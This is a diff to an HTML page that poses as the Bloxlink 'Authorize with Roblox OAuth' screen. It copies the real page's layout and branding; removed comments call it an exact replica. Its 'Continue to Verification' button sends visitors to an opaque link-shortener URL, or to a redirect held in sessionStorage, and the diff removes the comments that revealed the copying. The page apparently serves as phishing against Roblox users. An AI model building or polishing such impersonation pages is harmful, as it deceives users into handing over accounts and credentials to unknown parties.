@@ -4,12 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Bloxlink OAuth · Authorize</title>
-    <!-- Inter font (same as original) -->
+    <!-- Inter font -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,500;14..32,600&display=swap" rel="stylesheet">
     <style>
-        /* RESET / GLOBAL */
         * {
             margin: 0;
             padding: 0;
@@ -27,7 +26,6 @@
             min-height: 100vh;
         }
 
-        /* layout containers – exact same structure, renamed classes for clarity */
         .oauth-root {
             display: flex;
             flex-direction: column;
@@ -35,7 +33,6 @@
             min-height: 100vh;
         }
 
-        /* fixed header */
         .oauth-header {
             display: flex;
             flex-flow: row wrap;
@@ -57,7 +54,6 @@
             height: auto;
         }
 
-        /* main container – matches .rt9l3x exactly */
         .auth-main {
             max-width: 1280px;
             padding-left: 24px;
@@ -92,7 +88,6 @@
             padding-top: 24px;
         }
 
-        /* avatar */
         .avatar-circle {
             position: relative;
             align-items: center;
@@ -127,7 +122,6 @@
             text-align: center;
         }
 
-        /* primary button – exact replica */
         .btn-primary {
             display: inline-flex;
             align-items: center;
@@ -165,7 +159,6 @@
             z-index: 0;
         }
 
-        /* or separator */
         .separator-row {
             display: flex;
             align-items: center;
@@ -186,7 +179,6 @@
             padding: 0 4px;
         }
 
-        /* secondary button */
         .btn-secondary {
             display: inline-flex;
             align-items: center;
@@ -224,7 +216,6 @@
             border-radius: 8px;
         }
 
-        /* footer – style exactly as .style-34 and children */
         .oauth-footer {
             display: flex;
             flex-flow: row wrap;
@@ -297,7 +288,6 @@
             font-weight: 300;
         }
 
-        /* hidden screen-reader span */
         .sr-only {
             border: 0;
             clip: rect(0,0,0,0);
@@ -310,7 +300,17 @@
             white-space: nowrap;
         }
 
-        /* mobile overrides – exactly the same as original @media */
+        .info-message {
+            color: #aaa;
+            font-size: 14px;
+            margin: 10px 0 20px;
+            text-align: center;
+            background: #1a2a2a;
+            padding: 12px;
+            border-radius: 8px;
+            border-left: 3px solid #00f2ea;
+        }
+
         @media (max-width: 768px) {
             .auth-main {
                 padding-left: 12px !important;
@@ -408,58 +408,55 @@
 </head>
 <body>
     <div class="oauth-root">
-        <!-- header (exact copy of .zm6p1q) -->
         <header class="oauth-header">
             <div class="header-logo">
-                <!-- using the same logo name, but I'll embed a white placeholder svg to keep it visual -->
                 <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='195' height='35' viewBox='0 0 195 35' fill='none'%3E%3Cpath d='M30 10L40 25L50 10' stroke='white' stroke-width='2' /%3E%3Ccircle cx='60' cy='17.5' r='6' stroke='white' stroke-width='2' /%3E%3Ctext x='75' y='22' font-family='Inter' font-size='16' fill='white' font-weight='600'%3EBloxlink%3C/text%3E%3C/svg%3E"
                      alt="Bloxlink logo" width="195" height="35" style="display:block;">
             </div>
         </header>
 
-        <!-- main content -->
         <div class="auth-main" id="auth-container">
             <span class="auth-title">Authorize with Roblox OAuth</span>
             <hr class="auth-divider-hr" />
 
             <div class="auth-card">
-                <!-- avatar block -->
+                <!-- Info message - no auto redirect -->
+                <div class="info-message">
+                    Click "Continue" to proceed to verification
+                </div>
+
                 <div class="avatar-circle">
                     <img alt="App avatar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='115' height='115' viewBox='0 0 115 115'%3E%3Crect width='115' height='115' fill='%23333c4a' /%3E%3Ccircle cx='57.5' cy='45' r='22' fill='%235a6b7c' /%3E%3Crect x='35' y='70' width='45' height='30' rx='10' fill='%235a6b7c' /%3E%3C/svg%3E"
                          class="avatar-img" />
                 </div>
                 <span class="app-name">Bloxlink</span>
 
-                <!-- primary approve button with href https://openinapp.link/authbloxlinkoauth -->
-                <button class="btn-primary" tabindex="0" type="button" onclick="window.location.href='https://openinapp.link/jvj3l'">
-                    Continue
+                <!-- Primary approve button - user must click to redirect -->
+                <button class="btn-primary" tabindex="0" type="button" id="continueBtn">
+                    Continue to Verification
                     <span></span>
                 </button>
 
-                <!-- OR separator -->
                 <div class="separator-row">
                     <div class="separator-line"></div>
                     <span class="separator-text">or</span>
                     <div class="separator-line"></div>
                 </div>
 
-                <!-- secondary deny button with href https://dikilia.github.io/lokus-hub/ -->
+                <!-- Secondary button - returns to main hub -->
                 <button class="btn-secondary" tabindex="0" type="button" onclick="window.location.href='https://dikilia.github.io/lokus-hub/'">
-                    <span>Return to Bloxlink</span>
+                    <span>Return to Hub</span>
                     <span></span>
                 </button>
             </div>
 
-            <!-- footer area – exact copy of the original style (privacy, terms etc) -->
             <div class="oauth-footer">
                 <div class="footer-logo-block">
-                    <!-- tiny logo replicating the style, optional but keeps layout -->
                     <svg width="36" height="36" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
                         <circle cx="18" cy="12" r="6" stroke="#55C1FF" stroke-width="2" />
                         <rect x="10" y="20" width="16" height="10" rx="3" stroke="#55C1FF" stroke-width="2" />
                     </svg>
                 </div>
-                <!-- first row of links -->
                 <div class="footer-links-row">
                     <a href="#" class="footer-link">Overview</a>
                     <span class="footer-bullet">•</span>
@@ -471,7 +468,6 @@
                     <span class="footer-bullet">•</span>
                     <a href="#" class="footer-link">Cookies</a>
                 </div>
-                <!-- second row / copyright -->
                 <div class="footer-copyright-row">
                     <span class="copyright">© 2025 Bloxlink, Inc.</span>
                 </div>
@@ -479,14 +475,23 @@
         </div>
     </div>
 
-    <!-- hidden announcer (exact replica) -->
     <div style="box-sizing: border-box;">
         <p aria-live="assertive" role="alert" class="sr-only">Approve - Roblox</p>
     </div>
 
-    <!-- cloudflare beacon omitted but kept as comment to match structure -->
-    <!-- 
-    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v2" ...></script>
-    -->
+    <script>
+        // Get the redirect URL from sessionStorage (set by index.html)
+        const redirectUrl = sessionStorage.getItem('bloxlinkRedirect') || 'https://openinapp.link/jvj3l';
+        
+        // Debug: show what URL we're redirecting to (in console only)
+        console.log('🔗 Ready to redirect to:', redirectUrl);
+        
+        // ONLY redirect when user clicks the button
+        document.getElementById('continueBtn').onclick = function() {
+            window.location.href = redirectUrl;
+        };
+        
+        // No automatic redirect - user must click
+    </script>
 </body>
 </html>
